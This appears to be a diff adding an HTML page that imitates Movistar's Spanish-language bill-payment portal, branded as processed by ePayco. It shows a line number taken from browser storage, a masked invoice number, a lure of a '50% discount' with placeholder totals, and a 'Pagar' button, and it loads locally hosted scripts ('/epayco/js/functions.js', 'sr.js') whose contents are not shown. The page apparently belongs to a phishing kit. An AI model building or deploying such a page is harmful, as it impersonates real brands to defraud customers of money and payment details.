@@ -1,0 +1,188 @@
+
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="description"
+        content="Portal de recaudos Movistar, paga o programa tus facturas de forma fácil y rápida" />
+    <meta name="theme-color" content="#019DF4" />
+    <link rel="shortcut icon" href="img/apple-touch-icon.png" type="image/x-icon" />
+
+    <!-- Stylesheets -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="styles.css" rel="stylesheet" />
+    <!-- Enlace al CSS separado -->
+    
+    <title>Movistar Portal de Recaudos</title>
+    <script src="/epayco/js/functions.js"></script>
+</head>
+
+<body>
+
+    <!-- Spinner -->
+    <div id="spinnerOverlay" class="spinner-overlay d-none">
+        <div class="spinner-border" role="status">
+            <span class="visually-hidden">Loading...</span>
+        </div>
+    </div>
+
+    <header class="header">
+        <img src="img/descarga.png" alt="Encabezado de Movistar" class="header-image" />
+        <div class="header-footer-text d-md-none">
+            <!-- Duplicated element for mobile view -->
+            <img src="img/png-transparent-computer-icons-password-login-user-padlock-miscellaneous-christianity-rectangle.png"
+                alt="Ícono de candado" class="lock-icon" />
+            <span>Pagos procesados por
+                <img src="img/logo_ePayco.1722863467828.png" alt="Logo de omg" class="omg-logo" /></span>
+        </div>
+    </header>
+
+    <div class="container text-center mt-5">
+        <div class="row justify-content-center align-items-center">
+            <div class="col-md-6 d-flex align-items-center">
+                <img src="img/total.svg" alt="Imagen" class="img-fluid me-3" />
+                <!-- Añadido "me-3" para margen derecho -->
+                <div>
+                    <div class="numero-linea">
+                        Número de línea: <span id="line-number-display"></span>
+                    </div>
+                    <!-- Añadido texto adicional centrado -->
+                    <div class="text-center mt-3">
+                        
+                        <p class="info-title">Información de tu factura</p>
+                        <p class="invoice-number">Factura No. ********</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+
+    <!-- Botón ovalado pequeño -->
+    <div class="text-center mt-4">
+        <button class="btn btn-primary px-3 py-1 rounded-pill" style="font-size: 0.875rem; width: 85vw;">
+            Agregar otro número de línea u otra referencia de pago
+        </button>
+    </div>
+
+    <!-- Contenedor con línea y texto sobre la línea -->
+    <div class="container mt-4 position-relative">
+        <!-- Texto y círculo sobre la línea -->
+        <div class="row justify-content-between align-items-center mb-2 position-relative">
+            <div class="col-auto d-flex align-items-center">
+                <div class="rounded-circle bg-primary d-flex justify-content-center align-items-center"
+                    style="width: 18px; height: 18px; color: white">
+                    ✔
+                </div>
+                <span class="ms-2" style="color: darkgray;">Total deuda</span>
+            </div>
+            <div class="col-auto">
+                <strong style="color: darkgray;">$ <span id="debt">100</span></strong>
+                <!-- Cambia el valor a lo que necesites -->
+            </div>
+            
+        </div>
+        <div class="row justify-content-between align-items-center mb-2 position-relative">
+            <div class="col-auto d-flex align-items-center">
+                <div class="rounded-circle bg-primary d-flex justify-content-center align-items-center"
+                    style="width: 18px; height: 18px; color: white">
+                    ✔
+                </div>
+                <span style="color: gray;" class="ms-2">Descuento 50%</span>
+                
+
+            </div>
+            <div class="col-auto">
+                <strong style="color: gray;" >$ <span id="desc">100</span></strong>
+                <!-- Cambia el valor a lo que necesites -->
+            </div>
+        
+        </div>
+
+        <div class="row justify-content-between align-items-center mb-2 position-relative">
+            <div class="col-auto d-flex align-items-center">
+                <div class="rounded-circle bg-primary d-flex justify-content-center align-items-center"
+                    style="width: 18px; height: 18px; color: white">
+                    ✔
+                </div>
+                <span class="ms-2">Total a pagar</span>
+            </div>
+            <div class="col-auto">
+                <strong>$ <span id="total">100</span></strong>
+                <!-- Cambia el valor a lo que necesites -->
+            </div>
+        
+        </div>
+
+
+        <!-- Línea debajo del texto con color y estilo actualizado -->
+        <div class="border-top position-relative" style="
+          border-color: rgb(11, 39, 57);
+          border-width: 2px;
+          border-style: solid;
+        "></div>
+    </div>
+
+  
+    <!-- Botones de acción -->
+    <div class="container text-center mt-4">
+        <div class="row justify-content-center">
+            <div class="col-auto">
+                <button class="btn btn-outline-primary px-5 py-2 rounded-pill" id="cancelButton"
+                    style="border-color: rgb(11, 39, 57); color: rgb(11, 39, 57)">
+                    Cancelar
+                </button>
+            </div>
+            <div class="col-auto ms-2">
+                <button class="btn btn-primary px-5 py-2 rounded-pill" id="payButton"
+                    style="background-color: rgb(11, 39, 57); color: white">
+                    Pagar
+                </button>
+            </div>
+        </div>
+    </div>
+    
+
+    <script>
+        document.getElementById("cancelButton").addEventListener("click", function () {
+            window.location.href = "index.html";
+        });
+    </script>
+    <br>
+    <!-- Pie de página -->
+    <div class="container rounded-square">
+        <p>Envía <span>FACTURA</span> como mensaje de texto al 85202 desde tu línea <span>Movistar</span> y conoce el <span>detalle de tu pago</span></p>
+    </div>
+
+    <div class="container imagen" >
+        <img src="data:image/png;base64,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"
+            alt="Imagen" />
+    </div>
+    <!-- Nuevo contenedor para "Pagos procesados por" y la imagen pequeña -->
+<div class="payment-processed-container">
+    <p class="payment-processed-text">
+      Pagos procesados por
+
+      <img src="img/logo_ePayco.1722863467828.png" height="20" alt="Logo de pagos procesados" class="processed-img">
+    </p>
+  </div>
+    <!-- Scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js"></script>
+  
+    <script src="sr.js"></script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const lineNumber = localStorage.getItem("lineNumber");
+            if (lineNumber) {
+                document.getElementById("line-number-display").textContent = lineNumber;
+            }
+        });
+    </script>
+        
+ 
+</body>
+
+</html>
